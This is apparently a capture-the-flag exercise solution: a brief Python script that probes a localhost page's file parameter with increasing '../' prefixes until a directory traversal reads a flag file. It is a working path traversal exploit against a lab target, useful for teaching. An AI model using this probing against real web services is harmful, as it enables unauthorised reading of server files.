#
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout if this occurs try narrowing
# down your search

import urllib.request

folder = ''
url = 'http://127.0.0.1:8082/humantechconfig?file=' + folder + 'human.conf'

response =  urllib.request.urlopen(url).read()
while (b"Flag: Not-Set" in response) or (b"No file found" in response):
	folder += '../'
	url = 'http://127.0.0.1:8082/humantechconfig?file=' + folder + 'human.conf'
	response = urllib.request.urlopen(url).read()

print(response)
